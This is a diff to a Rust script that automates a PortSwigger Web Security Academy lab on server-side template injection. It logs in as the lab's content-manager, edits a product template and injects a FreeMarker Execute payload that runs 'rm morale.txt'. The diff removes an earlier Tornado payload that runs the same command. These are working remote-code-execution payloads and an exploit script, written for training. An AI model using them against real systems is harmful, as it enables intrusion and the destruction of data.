@@ -1,17 +1,17 @@
-/**************************************************************
+/**********************************************************************
 *
-* Lab: Basic server-side template injection (code context)
+* Lab: Server-side template injection using documentation
 *
 * Hack Steps:
 *      1. Fetch the login page
 *      2. Extract the csrf token and session cookie to login
-*      3. Login as wiener
-*      4. Fetch wiener's profile
-*      5. Set the preferred name with the malicious payload
-*      6. Post a comment as wiener
-*      7. Fetch the post page to execute the payload
+*      3. Login as content-manager
+*      4. Fetch a product template
+*      5. Extract the csrf token to edit the template
+*      6. Edit the template and inject the malicious payload
+*      7. Fetch the product page after editing to execute the payload
 *
-***************************************************************/
+***********************************************************************/
 use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
@@ -27,7 +27,7 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a9b00e4037b47cc8055490b008c0087.web-security-academy.net";
+const LAB_URL: &str = "https://0a7400ec040b7daf806d5dfa00120021.web-security-academy.net";
 
 lazy_static! {
     static ref WEB_CLIENT: Client = build_web_client();
@@ -47,37 +47,37 @@ fn main() {
     let mut csrf_token = get_csrf_token(login_page);
 
     println!("{}", "OK".green());
-    print!("⦗3⦘ Logging in as wiener.. ");
+    print!("⦗3⦘ Logging in as content-manager.. ");
     flush_terminal();
 
-    let wiener_login = login_as_wiener(&session, &csrf_token);
+    let content_manager_login = login_as_content_manager(&session, &csrf_token);
 
     println!("{}", "OK".green());
-    print!("⦗4⦘ Fetching wiener's profile.. ");
+    print!("⦗4⦘ Fetching a product template.. ");
     flush_terminal();
 
-    session = get_session_cookie(&wiener_login);
-    let wiener_profile = fetch_with_session("/my-account", &session);
+    session = get_session_cookie(&content_manager_login);
+    let template_page = fetch_with_session("/product/template?productId=1", &session);
 
     println!("{}", "OK".green());
-    print!("⦗5⦘ Setting the preferred name with the malicious payload.. ");
+    print!("⦗5⦘ Extracting the csrf token to edit the template.. ");
     flush_terminal();
 
-    csrf_token = get_csrf_token(wiener_profile);
-    let payload = r###"user.first_name}}{%import os;os.system('rm morale.txt')%}"###;
-    set_preferred_name_with_payload(&session, &csrf_token, payload);
+    csrf_token = get_csrf_token(template_page);
 
     println!("{}", "OK".green());
-    print!("⦗6⦘ Posting a comment as wiener.. ");
+    print!("⦗6⦘ Editing the template and injecting the malicious payload.. ");
     flush_terminal();
 
-    post_comment(&session, &csrf_token);
+    let payload =
+        r###"<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm morale.txt")}"###;
+    edit_template_with_payload(&session, &csrf_token, &payload);
 
     println!("{}", "OK".green());
-    print!("⦗7⦘ Fetching the post page to execute the payload.. ");
+    print!("⦗7⦘ Fetching the product page after editing to execute the payload.. ");
     flush_terminal();
 
-    fetch("/post?postId=1"); // postId should be the same as the one used in posting a comment
+    fetch("/product?productId=1"); // productId should be the same as the one used in editing template
 
     println!("{}", "OK".green());
     println!("🗹 The morale.txt file is successfully deleted");
@@ -131,41 +131,27 @@ fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
     captures.get(1).unwrap().as_str().to_string()
 }
 
-fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
+fn login_as_content_manager(session: &str, csrf_token: &str) -> Response {
     WEB_CLIENT
         .post(format!("{LAB_URL}/login"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
-            ("username", "wiener"),
-            ("password", "peter"),
+            ("username", "content-manager"),
+            ("password", "C0nt3ntM4n4g3r"),
             ("csrf", &csrf_token),
         ]))
         .send()
         .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
 }
 
-fn set_preferred_name_with_payload(session: &str, csrf_token: &str, payload: &str) {
+fn edit_template_with_payload(session: &str, csrf_token: &str, payload: &str) {
     WEB_CLIENT
-        .post(format!(
-            "{LAB_URL}/my-account/change-blog-post-author-display"
-        ))
+        .post(format!("{LAB_URL}/product/template?productId=1"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
+            ("template", payload),
             ("csrf", csrf_token),
-            ("blog-post-author-display", payload),
-        ]))
-        .send()
-        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));
-}
-
-fn post_comment(session: &str, csrf_token: &str) {
-    WEB_CLIENT
-        .post(format!("{LAB_URL}/post/comment"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("postId", "1"),
-            ("comment", "to execute the malicious payload"),
-            ("csrf", csrf_token),
+            ("template-action", "save"),
         ]))
         .send()
         .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));
